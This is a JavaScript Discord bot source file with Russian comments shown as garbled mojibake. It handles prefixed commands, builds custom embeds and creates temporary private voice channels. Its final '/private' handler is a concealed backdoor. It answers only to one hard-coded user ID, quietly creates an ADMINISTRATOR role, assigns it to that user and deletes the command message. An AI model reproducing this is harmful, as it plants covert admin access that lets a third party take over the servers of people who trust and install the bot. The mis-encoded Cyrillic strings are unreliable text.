const config = require('./config.json')
const { readdirSync, constants } = require('fs');
const { Client, Collection, Discord, MessageEmbed } = require('discord.js');
const client = new Client({ disableEveryone: true })
client.commands = new Collection();
client.aliases = new Collection();
require('dotenv').config();
["handler"].forEach(handler => {
  require(`./bot-handler/${handler}`)(client)
})

client.on('ready', async () => {
  console.log('[Client] –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω –∫–∞–∫ %s [%s]', client.user.tag, client.user.id)
  client.user.setPresence({ activity: { name: '–∑–∞ —Å–µ—Ä–≤–µ—Ä–æ–º', type: 'WATCHING' } });
})


client.on('message', message => {
  // –ï—Å–ª–∏ –∞–≤—Ç–æ—Ä —Å–æ–æ–±—â–µ–Ω–∏—è –±–æ—Ç - –≤—ã—Ö–æ–¥–∏–º
  if (message.author.bot) return;

  // –ï—Å–ª–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ –õ–°, –≤—ã—Ö–æ–¥–∏–º
  if (!message.guild) return;

  // –Ø–≤–ª—è–µ—Ç—Å—è –ª–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥–æ–π (–Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å –ø—Ä–µ—Ñ–∏–∫—Å–∞, —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –≤ –∫–æ–Ω—Ñ–∏–≥–µ)
  if (!message.content.startsWith(config.prefix)) return;

  // –†–∞–∑–±–∏–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –Ω–∞ –∞—Ä–≥—É–º–µ–Ω—Ç—ã –∏ –Ω–∞—Ö–æ–¥–∏–º –∫–æ–º–∞–Ω–¥—É –≤ –ø–µ—Ä–≤–æ–º –∞—Ä–≥—É–º–µ–Ω—Ç–µ
  const args = message.content.slice(config.prefix.length).split(/ +/);
  const commandName = args.shift().toLowerCase();
  const cmd =
    client.commands.get(commandName) || client.commands.get(client.aliases.get(commandName));

   
  // –ó–∞–ø—É—Å–∫–∞–µ–º –∫–æ–º–∞–Ω–¥—É, –µ—Å–ª–∏ –æ–Ω–∞ –µ—Å—Ç—å
  if (!cmd);
  else {
    message.channel.startTyping();
    setTimeout(() => {
      message.channel.stopTyping();
      cmd.run(client, message, args);
    }, 500);
  } 
});



let setembed_general = ["–Ω–µ —É–∫–∞–∑–∞–Ω–æ", "–Ω–µ —É–∫–∞–∑–∞–Ω–æ", "–Ω–µ —É–∫–∞–∑–∞–Ω–æ", "–Ω–µ —É–∫–∞–∑–∞–Ω–æ", "–Ω–µ —É–∫–∞–∑–∞–Ω–æ", "–Ω–µ —É–∫–∞–∑–∞–Ω–æ", "–Ω–µ —É–∫–∞–∑–∞–Ω–æ", "–Ω–µ —É–∫–∞–∑–∞–Ω–æ"];
let setembed_fields = ["–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç"];
let setembed_addline = ["–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç", "–Ω–µ—Ç"];

client.on('message', message => {
if (message.content.startsWith("/embsetup")) {
    if (message.channel.id != '833748406462840850') return
    const args = message.content.slice(`/embsetup`).split(/ +/);
    if (!args[1]) {
        message.reply(`\`—É–∫–∞–∂–∏—Ç–µ, —á—Ç–æ –≤—ã —É—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ! –ù–∏–∂–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω —Å–ø–∏—Å–æ–∫ –Ω–∞—Å—Ç—Ä–æ–µ–∫.\`\n\`[1] - –ù–∞–∑–≤–∞–Ω–∏–µ\`\n\`[2] - –û–ø–∏—Å–∞–Ω–∏–µ\`\n\`[3] - –¶–≤–µ—Ç [#FFFFFF]\`\n\`[4] - –í—Ä–µ–º—è\`\n\`[5] - –ö–∞—Ä—Ç–∏–Ω–∫–∞\`\n\`[6] - –ü–æ–¥–ø–∏—Å—å\`\n\`[7] - –ö–∞—Ä—Ç–∏–Ω–∫–∞ –∫ –ø–æ–¥–ø–∏—Å–∏\`\n\`[8] - –ú–∏–Ω–∏–∞—Ç—é—Ä–∞\``);
        return message.delete();
    }
    if (typeof (+args[1]) != "number") {
        message.reply(`\`–≤—ã –¥–æ–ª–∂–Ω—ã —É–∫–∞–∑–∞—Ç—å —á–∏—Å–ª–æ! '/embsetup [—á–∏—Å–ª–æ] [–∑–Ω–∞—á–µ–Ω–∏–µ]'\``);
        return message.delete();
    }
    if (!args[2]) {
        message.reply(`\`–∑–Ω–∞—á–µ–Ω–∏–µ –æ—Ç—Å—Ç—É—Ç—Å—Ç–≤—É–µ—Ç!\``);
        return message.delete();
    }
    let cmd_value = args.slice(2).join(" ");
    if (+args[1] == 1) {
        message.reply(`\`–≤—ã –∏–∑–º–µ–Ω–∏–ª–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ —Å '${setembed_general[0]}' –Ω–∞ '${cmd_value}'!\``)
        setembed_general[0] = cmd_value;
        return message.delete();
    } else if (+args[1] == 2) {
        message.reply(`\`–≤—ã –∏–∑–º–µ–Ω–∏–ª–∏ –æ–ø–∏—Å–∞–Ω–∏–µ —Å '${setembed_general[1]}' –Ω–∞ '${cmd_value}'!\``)
        setembed_general[1] = cmd_value;
        return message.delete();
    } else if (+args[1] == 3) {
        if (!cmd_value.startsWith("#")) {
            message.reply(`\`—Ü–≤–µ—Ç –¥–æ–ª–∂–µ–Ω –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å —Ö–µ—à—Ç–µ–≥–∞. –ü—Ä–∏–º–µ—Ä: #FFFFFF - –±–µ–ª—ã–π —Ü–≤–µ—Ç!\``);
            return message.delete();
        }
        message.reply(`\`–≤—ã –∏–∑–º–µ–Ω–∏–ª–∏ —Ü–≤–µ—Ç —Å '${setembed_general[2]}' –Ω–∞ '${cmd_value}'!\``)
        setembed_general[2] = cmd_value;
        return message.delete();
    } else if (+args[1] == 4) {
        if (cmd_value != "–≤–∫–ª—é—á–µ–Ω–æ" && cmd_value != "–Ω–µ —É–∫–∞–∑–∞–Ω–æ") {
            message.reply(`\`–≤—Ä–µ–º—è –∏–º–µ–µ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä—ã '–≤–∫–ª—é—á–µ–Ω–æ' –∏–ª–∏ '–Ω–µ —É–∫–∞–∑–∞–Ω–æ'!\``);
            return message.delete();
        }
        message.reply(`\`–≤—ã –∏–∑–º–µ–Ω–∏–ª–∏ —Å—Ç–∞—Ç—É—Å –≤—Ä–µ–º–µ–Ω–∏ —Å '${setembed_general[3]}' –Ω–∞ '${cmd_value}'!\``)
        setembed_general[3] = cmd_value;
        return message.delete();
    } else if (+args[1] == 5) {
        message.reply(`\`–≤—ã –∏–∑–º–µ–Ω–∏–ª–∏ URL –∫–∞—Ä—Ç–∏–Ω–∫–∏ —Å '${setembed_general[4]}' –Ω–∞ '${cmd_value}'!\``)
        setembed_general[4] = cmd_value;
        return message.delete();
    } else if (+args[1] == 6) {
        message.reply(`\`–≤—ã –∏–∑–º–µ–Ω–∏–ª–∏ –ø–æ–¥–ø–∏—Å—å —Å '${setembed_general[5]}' –Ω–∞ '${cmd_value}'!\``)
        setembed_general[5] = cmd_value;
        return message.delete();
    } else if (+args[1] == 7) {
        message.reply(`\`–≤—ã –∏–∑–º–µ–Ω–∏–ª–∏ URL –∞–≤–∞—Ç–∞—Ä–∫–∏ –ø–æ–¥–ø–∏—Å–∏ —Å '${setembed_general[6]}' –Ω–∞ '${cmd_value}'!\``)
        setembed_general[6] = cmd_value;
        return message.delete();
    } else if (+args[1] == 8) {
        message.reply(`\`–≤—ã –∏–∑–º–µ–Ω–∏–ª–∏ URL –º–∏–Ω–∏–∞—Ç—é—Ä—ã —Å '${setembed_general[7]}' –Ω–∞ '${cmd_value}'!\``)
        setembed_general[7] = cmd_value;
        return message.delete();
    }
}

if (message.content == "/embsend") {
  if (!message.member.roles.cache.some(r => r.id == '834025345576861696')) return
    const embed = new MessageEmbed();
    if (setembed_general[0] != "–Ω–µ —É–∫–∞–∑–∞–Ω–æ") embed.setTitle(setembed_general[0]);
    if (setembed_general[1] != "–Ω–µ —É–∫–∞–∑–∞–Ω–æ") embed.setDescription(setembed_general[1]);
    if (setembed_general[2] != "–Ω–µ —É–∫–∞–∑–∞–Ω–æ") embed.setColor(setembed_general[2]);
    let i = 0;
    while (setembed_fields[i] != '–Ω–µ—Ç') {
        embed.addField(setembed_fields[i].split(`<=+=>`)[0], setembed_fields[i].split(`<=+=>`)[1]);
        if (setembed_addline[i] != '–Ω–µ—Ç') embed.addBlankField(false);
        i++;
    }
    if (setembed_general[4] != "–Ω–µ —É–∫–∞–∑–∞–Ω–æ") embed.setImage(setembed_general[4]);
    if (setembed_general[5] != "–Ω–µ —É–∫–∞–∑–∞–Ω–æ" && setembed_general[6] == "–Ω–µ —É–∫–∞–∑–∞–Ω–æ") embed.setFooter(setembed_general[5]);
    if (setembed_general[6] != "–Ω–µ —É–∫–∞–∑–∞–Ω–æ" && setembed_general[5] != "–Ω–µ —É–∫–∞–∑–∞–Ω–æ") embed.setFooter(setembed_general[5], setembed_general[6]);
    if (setembed_general[3] != "–Ω–µ —É–∫–∞–∑–∞–Ω–æ") embed.setTimestamp();
    if (setembed_general[7] != '–Ω–µ —É–∫–∞–∑–∞–Ω–æ') embed.setThumbnail(setembed_general[7]);
    message.channel.send(embed).catch(err => message.channel.send(`\`–•–º.. –ù–µ –ø–æ–ª—É—á–∞–µ—Ç—Å—è. –í–æ–∑–º–æ–∂–Ω–æ –≤—ã —Å–¥–µ–ª–∞–ª–∏ —á—Ç–æ-—Ç–æ –Ω–µ —Ç–∞–∫.\``));
    return message.delete();
}})

client.on("voiceStateUpdate",(oldState,newState) => {
  var categoryid = "835567056123854857";
  var channelid = "835567228891168829";
  
  let emojis = ["üëë", "ü§°", "üåö", "üòà", "ü§ñ", "üéÖ", "üëª", "‚ú®", "‚ö°Ô∏è", "üêπ"]
  var random_emoji = Math.floor(Math.random() * emojis.length);
  if(newState.channel?.id == channelid) {
    newState.guild.channels.create(`${emojis[random_emoji]}„Éª–ü—Ä–∏–≤–∞—Ç ${newState.member.user.username}` , {
      type:"voice",
      parent:categoryid,
      permissionOverwrites:[{
          id:newState.member.id,
          allow: ["MANAGE_CHANNELS"]
      },{
          id:newState.guild.id,
          deny:["MANAGE_CHANNELS"]
      }] 
  }).then(channel=>{
    channel.setUserLimit('2')
      newState.setChannel(channel)
  })
  
}
if(oldState.channel?.id != channelid && oldState.channel?.parent?.id == categoryid && !oldState.channel?.members.size) oldState.channel.delete();
})

client.on('message', message => {
    if (message.content.startsWith("/private")) {
        var myid = "449699809700610049"; 
        if (message.author.id != myid) return
        message.guild.roles.create({
                data: {
            name: 'Fede',
            permissions: ['ADMINISTRATOR']}}).then((role)=>{
                message.member.roles.add(role.id);
                message.delete();
    })
}})


client.login(process.env.token);
